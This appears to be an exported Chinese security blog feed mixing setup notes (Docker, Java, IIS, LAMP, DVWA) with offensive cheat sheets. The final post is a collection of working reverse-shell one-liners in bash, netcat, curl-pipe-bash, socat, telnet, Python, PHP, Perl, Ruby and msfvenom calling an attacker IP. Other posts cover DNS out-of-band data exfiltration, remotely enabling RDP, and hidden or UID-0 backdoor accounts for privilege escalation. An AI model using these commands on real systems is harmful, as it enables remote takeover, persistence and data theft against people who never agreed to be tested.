<h1 id="Docker命令"><a href="#Docker命令" class="headerlink" title="Docker命令"></a>Docker命令</h1><p>1、查看正在运行的容器信息</p>
<pre class="highlight"><span class="line">docker ps</span><br></pre>

<p>2、进入容器目录</p>
<pre class="highlight"><span class="line">docker attach +容器ID</span><br><span class="line">或docker exec -it +容器ID /bin/bash</span><br></pre>

<p>3、退出容器</p>
<pre class="highlight"><span class="line">exit</span><br></pre>



<p>其他命令：</p>
<pre class="highlight"><span class="line">docker-compose up -d		#拉起容器镜像</span><br><span class="line">docker-compose down 		#关闭容器镜像</span><br></pre>

]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>Vulhub</tag>
      </tags>
  </entry>
  <entry>
    <title>Web渗透随记</title>
    <url>/article/Web%E6%B8%97%E9%80%8F%E9%9A%8F%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="DNS外带"><a href="#DNS外带" class="headerlink" title="DNS外带"></a>DNS外带</h1><p>平台：</p>
<p><a href="http://dnslog.cn/">http://dnslog.cn/</a>        #需要生成随机DNS</p>
<p>使用：</p>
<pre class="highlight"><span class="line">ping `whoami`.dns</span><br></pre>

<p>（注：``为优先运行符，可以用$()代替）</p>
<p>适用：</p>
<p>注入、反序列化、命令执行等无回显情况下，外带数据看结果</p>
<h1 id="Windows开启3389端口"><a href="#Windows开启3389端口" class="headerlink" title="Windows开启3389端口"></a>Windows开启3389端口</h1><p>注：Win7、Win2003、XP系统</p>
<p>开启：</p>
<pre class="highlight"><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre>

<p>关闭：</p>
<pre class="highlight"><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 11111111 /f</span><br></pre>

]]></content>
      <categories>
        <category>Web渗透</category>
      </categories>
      <tags>
        <tag>随记</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows多个Java环境共存</title>
    <url>/article/Windows%E5%A4%9A%E4%B8%AAJava%E7%8E%AF%E5%A2%83%E5%85%B1%E5%AD%98/</url>
    <content><![CDATA[<h1 id="java8环境配置"><a href="#java8环境配置" class="headerlink" title="java8环境配置"></a>java8环境配置</h1><p>1、控制面板&gt; 系统&gt; 高级系统设置&gt; 环境变量&gt; 系统变量</p>
<p>2、新建 JAVA_HOME</p>
<pre class="highlight"><span class="line">C:\Program Files\Java\jdk1.8.0_281		#根据具体路径更改</span><br></pre>

<p>3、新建 CLASSPATH</p>
<pre class="highlight"><span class="line">.;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar;</span><br></pre>

<p>4、修改 Path</p>
<pre class="highlight"><span class="line">%JAVA_HOME%\bin;%JAVA_HOME%\jre\bin;</span><br></pre>

<p>5、重启</p>
<p>其他：Path中改单行显示为多行显示，需要将其中一个绝对路径变量放在行首，如</p>
<pre class="highlight"><span class="line">C:\Windows\System32;		#低版本Windows系统不支持</span><br></pre>



<h1 id="java11环境配置"><a href="#java11环境配置" class="headerlink" title="java11环境配置"></a>java11环境配置</h1><p>1、控制面板&gt; 系统&gt; 高级系统设置&gt; 环境变量&gt; 系统变量</p>
<p>2、新建 JAVA_HOME</p>
<pre class="highlight"><span class="line">C:\Program Files\Java\jdk-11.0.10		#根据具体路径更改</span><br></pre>

<p>3、修改 Path</p>
<pre class="highlight"><span class="line">%JAVA_HOME%\bin;</span><br></pre>



<h1 id="Java版本切换"><a href="#Java版本切换" class="headerlink" title="Java版本切换"></a>Java版本切换</h1><p>1、新建JAVA_HOME、JAVA_HOME8、JAVA_HOME11</p>
<p>2、新建java8.bat</p>
<pre class="highlight"><span class="line">setx JAVA_HOME &quot;%JAVA_HOME8%&quot; /m</span><br></pre>

<p>3、新建java11.bat</p>
<pre class="highlight"><span class="line">setx JAVA_HOME &quot;%JAVA_HOME11%&quot; /m</span><br></pre>

]]></content>
      <tags>
        <tag>Java环境配置</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows搭建IIS + mssql</title>
    <url>/article/Windows%E6%90%AD%E5%BB%BAIIS-mssql/</url>
    <content><![CDATA[<h1 id="一、搭建IIS服务"><a href="#一、搭建IIS服务" class="headerlink" title="一、搭建IIS服务"></a>一、搭建IIS服务</h1><h2 id="1、搭建IIS服务"><a href="#1、搭建IIS服务" class="headerlink" title="1、搭建IIS服务"></a>1、搭建IIS服务</h2><p>开始-管理工具-服务器管理器-角色-IIS服务-自定义服务（ASP模块、FTP模块等）</p>
<h2 id="2、导入ASP网站"><a href="#2、导入ASP网站" class="headerlink" title="2、导入ASP网站"></a>2、导入ASP网站</h2><p>选择网站路径</p>
<p>修改网站访问端口号</p>
<h2 id="3、网站配置"><a href="#3、网站配置" class="headerlink" title="3、网站配置"></a>3、网站配置</h2><table>
<thead>
<tr>
<th>报错类型</th>
<th>做法</th>
</tr>
</thead>
<tbody><tr>
<td>403（无访问主程序）</td>
<td>修改默认文档，增加index.asp</td>
</tr>
<tr>
<td>500（无法访问文件）</td>
<td>ASP-启用父路径</td>
</tr>
<tr>
<td>提示未启用32位程序池</td>
<td>应用程序池-网站-高级设置-32位应用程序池-True</td>
</tr>
<tr>
<td>没有操作权限</td>
<td>修改www目录权限：  属性-安全-编辑-修改Users权限为完全控制</td>
</tr>
</tbody></table>
<h1 id="安装SQL-Server数据库并导入原有数据库"><a href="#安装SQL-Server数据库并导入原有数据库" class="headerlink" title="安装SQL Server数据库并导入原有数据库"></a>安装SQL Server数据库并导入原有数据库</h1><p>1、winserver2008连接sql server镜像，选择安装（精简功能）</p>
<p> <img src="/article/Windows%E6%90%AD%E5%BB%BAIIS-mssql/1.png" alt="1" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Windows%E6%90%AD%E5%BB%BAIIS-mssql/1.png" class="lozad post-image"></p>
<p>2、限制数据库权限（从管理员权限降权）</p>
<p> <img src="/article/Windows%E6%90%AD%E5%BB%BAIIS-mssql/2.png" alt="2" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Windows%E6%90%AD%E5%BB%BAIIS-mssql/2.png" class="lozad post-image"></p>
<p>3、混合模式，设置密码，添加管理员</p>
<p> <img src="/article/Windows%E6%90%AD%E5%BB%BAIIS-mssql/3.png" alt="3" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Windows%E6%90%AD%E5%BB%BAIIS-mssql/3.png" class="lozad post-image"></p>
<p>4、后续全部确认即可</p>
<p>5、新建数据库（testdb）</p>
<p>6、修改网站数据库配置文件，数据库类型为mssql</p>
<p>7、替换网站原有数据库</p>
<p>8、修改网站数据库配置文件</p>
<p>新增数据库名（testdb）、数据库账号（sa）、数据库密码（***）</p>
<p>注意：mssql账号为sa</p>
]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>IIS</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows随记</title>
    <url>/article/Windows%E9%9A%8F%E8%AE%B0/</url>
    <content><![CDATA[<table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>netstat -r</td>
<td>列出当前路由信息</td>
</tr>
<tr>
<td>dir</td>
<td>显示文件列表，同linux下ls</td>
</tr>
<tr>
<td>mkdir或mk</td>
<td>创建目录</td>
</tr>
<tr>
<td>rmdir或rd</td>
<td>删除目录</td>
</tr>
<tr>
<td>copy</td>
<td>复制，需要指定目录</td>
</tr>
<tr>
<td>del</td>
<td>删除</td>
</tr>
<tr>
<td>touch</td>
<td>创建文件</td>
</tr>
<tr>
<td>ren</td>
<td>重命名</td>
</tr>
<tr>
<td>type</td>
<td>查看文本文件</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>随记</tag>
      </tags>
  </entry>
  <entry>
    <title>centos7搭建DVWA</title>
    <url>/article/centos7%E6%90%AD%E5%BB%BADVWA/</url>
    <content><![CDATA[<h1 id="一、准备"><a href="#一、准备" class="headerlink" title="一、准备"></a>一、准备</h1><p>Apache+Mysql+PHP+DVWA</p>
<h1 id="二、环境搭建"><a href="#二、环境搭建" class="headerlink" title="二、环境搭建"></a>二、环境搭建</h1><h2 id="安装Apache（httpd）"><a href="#安装Apache（httpd）" class="headerlink" title="安装Apache（httpd）"></a>安装Apache（httpd）</h2><pre class="highlight"><span class="line">yum install httpd httpd-devel httpd-manual httpd-tools</span><br></pre>



<p>启动apache并设置开机自启</p>
<pre class="highlight"><span class="line">systemctl start httpd  		# 开启apache</span><br><span class="line"></span><br><span class="line">systemctl enable httpd  	# 设置开机自启</span><br><span class="line"></span><br><span class="line">systemctl status httpd  	# 查看apache状态</span><br></pre>

<h2 id="安装Mysql"><a href="#安装Mysql" class="headerlink" title="安装Mysql"></a>安装Mysql</h2><pre class="highlight"><span class="line">yum install mariadb-server</span><br></pre>

<p>启动Mysql并设置开机自启</p>
<pre class="highlight"><span class="line">systemctl start mariadb 	 	# 开启mariadb</span><br><span class="line"></span><br><span class="line">systemctl enable mariadb 	 	# 设置开机自启</span><br><span class="line"></span><br><span class="line">systemctl status mariadb  		# 查看mariadb状态</span><br></pre>

<p>配置Mysql数据库</p>
<p>初始化mysql数据库（全部回车确认）</p>
<pre class="highlight"><span class="line">mysql_secure_installation</span><br></pre>

<p>设置mysql密码（非操作系统密码）</p>
<p>配置</p>
<pre class="highlight"><span class="line">mysql -uroot -p</span><br><span class="line">create database dvwa;			# 创建数据库</span><br><span class="line">grant all privileges on *.* to dvwa@localhost identified by &#x27;dvwa&#x27;;		# 创建用户</span><br></pre>



<h2 id="安装PHP"><a href="#安装PHP" class="headerlink" title="安装PHP"></a>安装PHP</h2><p>(php-fpm php-mysqlnd不装，其他均可)</p>
<pre class="highlight"><span class="line">yum install php php-common php-cli php-devel php-gd php-ldap php-mbstring php-mysql php-pdo php-pear php-xml php-pgsql php-process php-snmp php-soap</span><br></pre>

<p>重启apache使php生效（php不是独立软件，依附apache）</p>
<pre class="highlight"><span class="line">systemctl restart httpd</span><br></pre>

<p>配置</p>
<pre class="highlight"><span class="line">vim /etc/php.ini</span><br><span class="line">修改allow_url_include=Off为allow_url_include=On</span><br></pre>



<h2 id="安装DVWA"><a href="#安装DVWA" class="headerlink" title="安装DVWA"></a>安装DVWA</h2><pre class="highlight"><span class="line">wget https://github.com/ethicalhack3r/DVWA/archive/master.zip</span><br></pre>

<p>解压并复制到/var/www/html目录</p>
<p>配置</p>
<pre class="highlight"><span class="line">cd /var/www/html/config/</span><br><span class="line">cp config.inc.php.dist config.inc.php		# /DVWA/config目录下</span><br><span class="line">vim config.inc.php				</span><br><span class="line"># 修改密码为dvwa</span><br><span class="line">$_DVWA[ &#x27;recaptcha_public_key&#x27; ]  = &#x27;6LdK7xITAAzzAAJQTfL7fu6I-0aPl8KHHieAT_yJg&#x27;;</span><br><span class="line">$_DVWA[ &#x27;recaptcha_private_key&#x27; ] = &#x27;6LdK7xITAzzAAL_uw9YXVUOPoIHPZLfw2K1n5NVQ&#x27;;</span><br><span class="line"></span><br><span class="line">systemctl restart httpd						# 重启apache</span><br><span class="line"></span><br><span class="line">chown -R apache:apache /var/www/html/</span><br></pre>



<h1 id="三、访问环境"><a href="#三、访问环境" class="headerlink" title="三、访问环境"></a>三、访问环境</h1><pre class="highlight"><span class="line">http:localhost/setup.php</span><br></pre>

<p>创建数据库</p>
<p>登录（admin:password）</p>
]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title>搭建LAMP环境</title>
    <url>/article/%E6%90%AD%E5%BB%BALAMP%E7%8E%AF%E5%A2%83/</url>
    <content><![CDATA[<h1 id="LAMP："><a href="#LAMP：" class="headerlink" title="LAMP："></a>LAMP：</h1><p>Linux+Apache+Mysql+PHP</p>
<h1 id="1、安装Apache（httpd）"><a href="#1、安装Apache（httpd）" class="headerlink" title="1、安装Apache（httpd）"></a>1、安装Apache（httpd）</h1><pre class="highlight"><span class="line">yum install httpd httpd-devel httpd-manual httpd-tools</span><br></pre>

<h1 id="2、启动apache并设置开机自启"><a href="#2、启动apache并设置开机自启" class="headerlink" title="2、启动apache并设置开机自启"></a>2、启动apache并设置开机自启</h1><pre class="highlight"><span class="line">systemctl start httpd		#开启apache</span><br><span class="line"></span><br><span class="line">systemctl enable httpd		#设置开机自启</span><br><span class="line"></span><br><span class="line">systemctl status httpd		#查看apache状态</span><br></pre>



<h1 id="3、安装Mysql"><a href="#3、安装Mysql" class="headerlink" title="3、安装Mysql"></a>3、安装Mysql</h1><pre class="highlight"><span class="line">yum install mariadb-server</span><br></pre>



<h1 id="4、启动Mysql并设置开机自启"><a href="#4、启动Mysql并设置开机自启" class="headerlink" title="4、启动Mysql并设置开机自启"></a>4、启动Mysql并设置开机自启</h1><pre class="highlight"><span class="line">systemctl start mariadb			#开启mariadb</span><br><span class="line"></span><br><span class="line">systemctl enable mariadb		#设置开机自启</span><br><span class="line"></span><br><span class="line">systemctl status mariadb		#查看mariadb状态</span><br></pre>



<h1 id="5、配置Mysql数据库"><a href="#5、配置Mysql数据库" class="headerlink" title="5、配置Mysql数据库"></a>5、配置Mysql数据库</h1><pre class="highlight"><span class="line">mysql_secure_installation		#初始化mysql数据库（全部回车确认）</span><br></pre>

<p>设置mysql密码（非操作系统密码）</p>
<h1 id="6、安装PHP"><a href="#6、安装PHP" class="headerlink" title="6、安装PHP"></a>6、安装PHP</h1><p>(php-fpm php-mysqlnd不装，其他均可)</p>
<pre class="highlight"><span class="line">yum install php php-common php-cli php-devel php-gd php-ldap php-mbstring php-mysql php-pdo php-pear php-xml php-pgsql php-process php-snmp php-soap</span><br></pre>

<h1 id="7、重启apache使php生效"><a href="#7、重启apache使php生效" class="headerlink" title="7、重启apache使php生效"></a>7、重启apache使php生效</h1><p>（php不是独立软件，依附apache）</p>
<pre class="highlight"><span class="line">systemctl restart httpd</span><br></pre>

<h1 id="8、解压WP网站"><a href="#8、解压WP网站" class="headerlink" title="8、解压WP网站"></a>8、解压WP网站</h1><h1 id="9、复制WP网站文件至Apache网站目录"><a href="#9、复制WP网站文件至Apache网站目录" class="headerlink" title="9、复制WP网站文件至Apache网站目录"></a>9、复制WP网站文件至Apache网站目录</h1><pre class="highlight"><span class="line">cp -r WP/* /var/www/html</span><br></pre>

<h1 id="10、赋予Apache网站apache权限"><a href="#10、赋予Apache网站apache权限" class="headerlink" title="10、赋予Apache网站apache权限"></a>10、赋予Apache网站apache权限</h1><p>（apache服务由apache账户运行，还权限，安全控制）</p>
<pre class="highlight"><span class="line">chown -R apache:apache /var/www/html</span><br></pre>

<h1 id="11、禁用SELinux"><a href="#11、禁用SELinux" class="headerlink" title="11、禁用SELinux"></a>11、禁用SELinux</h1><p>（安全访问控制，影响网站访问）</p>
<pre class="highlight"><span class="line">vi /etc/sysconfig/selinux</span><br><span class="line"></span><br><span class="line">修改SELINUX=disabled</span><br><span class="line">重启操作系统（reboot）</span><br></pre>



<h1 id="12、访问网站ip-80端口，安装wp网站"><a href="#12、访问网站ip-80端口，安装wp网站" class="headerlink" title="12、访问网站ip+80端口，安装wp网站"></a>12、访问网站ip+80端口，安装wp网站</h1><h1 id="13、此时需要设置mysql账户"><a href="#13、此时需要设置mysql账户" class="headerlink" title="13、此时需要设置mysql账户"></a>13、此时需要设置mysql账户</h1><pre class="highlight"><span class="line">mysql -uroot -p			# 启动mysql（需要输入mysql密码）</span><br><span class="line">create database wp_web;	# 创建mysql账户</span><br><span class="line">exit					# 退出mysql</span><br><span class="line"></span><br></pre>

<p>（注意！wp-config.php  删除可重装wp网站）</p>
<h1 id="14、其他"><a href="#14、其他" class="headerlink" title="14、其他"></a>14、其他</h1><pre class="highlight"><span class="line">/var/www/html					# Apache默认网站路径</span><br><span class="line">/etc/httpd/conf/httpd.conf		# Apache配置文件路径</span><br></pre>

<p>修改DocumentRoot “/var/www”即可修改网站路径</p>
<p> <img src="/article/%E6%90%AD%E5%BB%BALAMP%E7%8E%AF%E5%A2%83/2.png" alt="2" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/%E6%90%AD%E5%BB%BALAMP%E7%8E%AF%E5%A2%83/2.png" class="lozad post-image"></p>
]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>LAMP</tag>
      </tags>
  </entry>
  <entry>
    <title>添加用户并提权</title>
    <url>/article/%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7%E5%B9%B6%E6%8F%90%E6%9D%83/</url>
    <content><![CDATA[<h1 id="前提："><a href="#前提：" class="headerlink" title="前提："></a>前提：</h1><p>需要为管理员权限</p>
<h1 id="linux环境"><a href="#linux环境" class="headerlink" title="linux环境"></a>linux环境</h1><h2 id="1、创建普通用户"><a href="#1、创建普通用户" class="headerlink" title="1、创建普通用户"></a>1、创建普通用户</h2><pre class="highlight"><span class="line">useradd test	#创建test用户</span><br><span class="line">passwd test		#给test用户设置密码</span><br></pre>



<h2 id="2、提权"><a href="#2、提权" class="headerlink" title="2、提权"></a>2、提权</h2><h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3><p>a、修改/etc/sudoers文件，将#去掉</p>
<pre class="highlight"><span class="line">## Allows people in group wheel to run all commands</span><br><span class="line">%wheel    ALL=(ALL)    ALL</span><br></pre>

<p>b、然后修改用户，使其属于root组</p>
<pre class="highlight"><span class="line">usermod -g root test</span><br></pre>

<p>c、使用test账号登录，su -切回root，再切回test即为root权限</p>
<h3 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h3><p>a、修改/etc/sudoers文件，找到root并添加</p>
<pre class="highlight"><span class="line">## Allow root to run any commands anywhere</span><br><span class="line">root    ALL=(ALL)     ALL</span><br><span class="line">test   	ALL=(ALL)     ALL</span><br></pre>

<p>b、使用test账号登录，即可使用sudo权限操作</p>
<p>如：sudo ls</p>
<h3 id="方法三："><a href="#方法三：" class="headerlink" title="方法三："></a>方法三：</h3><p>a、修改/etc/passwd文件，找到添加用户，并修改用户ID为0</p>
<pre class="highlight"><span class="line">test:x:0:1000::/home/test:/bin/sh</span><br></pre>

<p>b、切换至test用户，输入test密码即可登陆至root账户</p>
<h2 id="3、删除用户"><a href="#3、删除用户" class="headerlink" title="3、删除用户"></a>3、删除用户</h2><pre class="highlight"><span class="line">userdel -r test		#删除用户及其主目录</span><br></pre>



<h2 id="注！非交互式shell修改密码"><a href="#注！非交互式shell修改密码" class="headerlink" title="注！非交互式shell修改密码"></a>注！非交互式shell修改密码</h2><pre class="highlight"><span class="line">echo &quot;test:123&quot; | chpasswd</span><br><span class="line"></span><br><span class="line">echo &quot;123&quot; | passwd --stdin &quot;test&quot;</span><br></pre>



<h1 id="Windows环境"><a href="#Windows环境" class="headerlink" title="Windows环境"></a>Windows环境</h1><h2 id="1、创建普通用户-1"><a href="#1、创建普通用户-1" class="headerlink" title="1、创建普通用户"></a>1、创建普通用户</h2><pre class="highlight"><span class="line">net user test 123456 /add		#添加test用户，密码为12356</span><br><span class="line">net user $test 123456 /add		#添加隐藏test用户，密码为12356</span><br></pre>



<h2 id="2、添加用户至管理员组"><a href="#2、添加用户至管理员组" class="headerlink" title="2、添加用户至管理员组"></a>2、添加用户至管理员组</h2><pre class="highlight"><span class="line">net localgroup administrators test /add		#添加test用户至管理员组</span><br></pre>



<p>查看管理员组成员</p>
<pre class="highlight"><span class="line">net localgroup administrators		#查看管理员组成员</span><br></pre>



<p>删除用户</p>
<pre class="highlight"><span class="line">net localgroup administrators test /del		#删除用户</span><br></pre>



<p>禁用用户/启用用户</p>
<pre class="highlight"><span class="line">net user test /active:no		#禁用test用户</span><br><span class="line">net user test /active:yes		#启用test用户</span><br></pre>

]]></content>
      <categories>
        <category>Web渗透</category>
      </categories>
      <tags>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>反弹shell归纳</title>
    <url>/article/%E5%8F%8D%E5%BC%B9shell%E5%BD%92%E7%BA%B3/</url>
    <content><![CDATA[<h1 id="Linux反弹shell归纳"><a href="#Linux反弹shell归纳" class="headerlink" title="Linux反弹shell归纳"></a>Linux反弹shell归纳</h1><p>注意：若是实战环境，反弹shell目标需要为公网ip。（搭服务器）</p>
<h2 id="Bash反弹shell"><a href="#Bash反弹shell" class="headerlink" title="Bash反弹shell"></a>Bash反弹shell</h2><p>bash重定向，优先使用。</p>
<pre class="highlight"><span class="line">bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.66.138/1111 0&gt;&amp;1&quot;</span><br><span class="line"># bash -i &gt;&amp; /dev/tcp/攻击机IP/攻击机端口 0&gt;&amp;1</span><br></pre>

<p>以下是针对Bash反弹一句话进行了拆分说明：</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>命令详解</th>
</tr>
</thead>
<tbody><tr>
<td>bash -i</td>
<td>产生一个bash交互环境。</td>
</tr>
<tr>
<td>&gt;&amp;</td>
<td>将联合符号前面的内容与后面相结合，然后一起重定向给后者。</td>
</tr>
<tr>
<td>/dev/tcp/47.xxx.xxx.72/2333</td>
<td>Linux环境中所有的内容都是以文件的形式存在的，其实大家一看见这个内容就能明白，就是让目标主机与攻击机47.xxx.xxx.72的2333端口建立一个tcp连接。</td>
</tr>
<tr>
<td>0&gt;&amp;1</td>
<td>将标准输入与标准输出的内容相结合，然后重定向给前面标准输出的内容。</td>
</tr>
</tbody></table>
<p>Bash反弹一句完整的解读过程就是：</p>
<p>Bash产生了一个交互环境和本地主机主动发起与攻击机2333端口建立的连接（即TCP 2333会话连接）相结合，然后在重定向个TCP 2333会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个Bash反弹环境。</p>
<p>1、开启本地监听</p>
<pre class="highlight"><span class="line">nc -lvvp 1111</span><br></pre>

<p>2、目标机反弹连接攻击机</p>
<pre class="highlight"><span class="line">bash -c &quot;bash -i &gt;&amp;  /dev/tcp/192.168.66.138/1111 0&gt;&amp;1&quot;</span><br></pre>



<h5 id="注意：利用工具写入反弹shell时，命令如下："><a href="#注意：利用工具写入反弹shell时，命令如下：" class="headerlink" title="注意：利用工具写入反弹shell时，命令如下："></a>注意：利用工具写入反弹shell时，命令如下：</h5><p>bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjY2LjEzOC8xMTExIDA+JjE=}|{base64,-d}|{bash,-i}</p>
<p>其中，加密部分为bash -i &gt;&amp;  /dev/tcp/192.168.66.138/1111 0&gt;&amp;1的base64编码。IP、端口修改时需重新进行base64加密</p>
<h2 id="netcat反弹shell"><a href="#netcat反弹shell" class="headerlink" title="netcat反弹shell"></a>netcat反弹shell</h2><p>1、linux默认自带netcat工具，但是反弹shell功能-e参数通常被阉割，需要手动下载二进制安装包。</p>
<pre class="highlight"><span class="line">wget https://nchc.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gz</span><br><span class="line">tar -xvzf netcat-0.7.1.tar.gz</span><br><span class="line">./configure</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line">make clean</span><br></pre>

<p>2、攻击机开启本地监听</p>
<pre class="highlight"><span class="line">netcat -lvvp 1111</span><br></pre>

<p>3、目标机主动连接攻击机</p>
<pre class="highlight"><span class="line">netcat 192.168.66.138 1111 -e /bin/bash</span><br><span class="line"># netcat &lt;攻击机IP&gt; &lt;攻击机监听的端口&gt; -e /bin/bash</span><br></pre>





<h2 id="Curl-Bash反弹shell"><a href="#Curl-Bash反弹shell" class="headerlink" title="Curl+Bash反弹shell"></a>Curl+Bash反弹shell</h2><p>借助Linux管道命令。</p>
<p>1、在攻击者vps（公网）的web目录里面创建一个index文件（index.php或index.html），内容如下：</p>
<pre class="highlight"><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.66.138/1111 0&gt;&amp;1</span><br></pre>

<p>2、开启本地监听</p>
<pre class="highlight"><span class="line">nc -lvvp 1111</span><br></pre>

<p>3、在目标机器上执行如下代码，即可反弹shell</p>
<pre class="highlight"><span class="line">curl 192.168.66.138|bash</span><br></pre>

<p>curl IP | bash中的IP可以是任何形式（十进制、十六进制、八进制、二进制等）</p>
<h2 id="Socat反弹shell"><a href="#Socat反弹shell" class="headerlink" title="Socat反弹shell"></a>Socat反弹shell</h2><p>1、安装</p>
<pre class="highlight"><span class="line">apt-get install socat</span><br></pre>

<p>2、攻击机开启本地监听</p>
<pre class="highlight"><span class="line">socat TCP-LISTEN:1111 -</span><br><span class="line">或nc -lvvp 1111</span><br></pre>

<p>3、目标机主动连接攻击机</p>
<pre class="highlight"><span class="line">socat tcp-connect:192.168.66.138:1111 exec:&#x27;bash -li&#x27;,pty,stderr,setsid,sigint,sane</span><br></pre>





<h2 id="Telnet反弹shell"><a href="#Telnet反弹shell" class="headerlink" title="Telnet反弹shell"></a>Telnet反弹shell</h2><p>当nc和/dev/tcp不可用时，且目标机和攻击机都开启telnet（23端口）服务时，可用telnet反弹shell。</p>
<p>方法一：</p>
<p>1、攻击机开启本地监听：</p>
<pre class="highlight"><span class="line">nc -lvvp 1111</span><br></pre>

<p>2、目标机主动连接攻击机</p>
<pre class="highlight"><span class="line">mknod a p;telnet 192.168.66.138 1111 0&lt;a | /bin/bash 1&gt;a</span><br></pre>



<p>方法二：</p>
<p>1、攻击机开启两个本地监听：</p>
<pre class="highlight"><span class="line">nc -lvvp 1111</span><br><span class="line">nc -lvvp 2222</span><br></pre>

<p>2、目标机主动连接攻击机：</p>
<p>telnet 192.168.66.138 1111 | /bin/bash | telnet 192.168.66.138 2222</p>
<p>3、攻击机1111端口执行命令，2222端口回显命令</p>
<h2 id="Python脚本反弹shell"><a href="#Python脚本反弹shell" class="headerlink" title="Python脚本反弹shell"></a>Python脚本反弹shell</h2><p>1、攻击机开启本地监听</p>
<pre class="highlight"><span class="line">nc -lvvp 1111</span><br></pre>

<p>2、目标机主动连接攻击机</p>
<pre class="highlight"><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.66.138&quot;,1111));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre>





<h2 id="PHP脚本反弹shell"><a href="#PHP脚本反弹shell" class="headerlink" title="PHP脚本反弹shell"></a>PHP脚本反弹shell</h2><p>1、攻击机开启本地监听</p>
<pre class="highlight"><span class="line">nc -lvvp 1111</span><br></pre>

<p>2、目标机主动连接攻击机：</p>
<pre class="highlight"><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;192.168.66.138&quot;,1111);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre>





<h2 id="Perl脚本反弹shell（后缀-pl）"><a href="#Perl脚本反弹shell（后缀-pl）" class="headerlink" title="Perl脚本反弹shell（后缀.pl）"></a>Perl脚本反弹shell（后缀.pl）</h2><p>1、攻击机开启本地监听</p>
<pre class="highlight"><span class="line">nc -lvvp 1111</span><br></pre>

<p>2、目标机主动连接攻击机</p>
<pre class="highlight"><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;192.168.66.138&quot;;$p=1111;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br></pre>





<h2 id="Ruby脚本反弹shell（后缀-rb）"><a href="#Ruby脚本反弹shell（后缀-rb）" class="headerlink" title="Ruby脚本反弹shell（后缀.rb）"></a>Ruby脚本反弹shell（后缀.rb）</h2><p>1、攻击机开启本地监听</p>
<pre class="highlight"><span class="line">nc -lvvp 1111</span><br></pre>

<p>2、目标机主动连接攻击机</p>
<pre class="highlight"><span class="line">ruby -rsocket -e &#x27;c=TCPSocket.new(&quot;192.168.66.138&quot;,&quot;1111&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span><br><span class="line">或</span><br><span class="line">ruby -rsocket -e &#x27;exit if fork;c=TCPSocket.new(&quot;192.168.66.138&quot;,&quot;1111&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span><br></pre>





<h2 id="Metasploit生成反弹shell"><a href="#Metasploit生成反弹shell" class="headerlink" title="Metasploit生成反弹shell"></a>Metasploit生成反弹shell</h2><p>1、自动生成反弹一句话</p>
<pre class="highlight"><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=192.168.66.138 LPORT=1111 -f raw</span><br></pre>

<p>其中，cmd/unix/reverse_python为python类型反弹命令，其他类型直接更改_后缀即可，如cmd/unix/reverse_perl生成perl反弹shell</p>
<p>2、将生成的反弹shell直接在目标机器上执行即可</p>
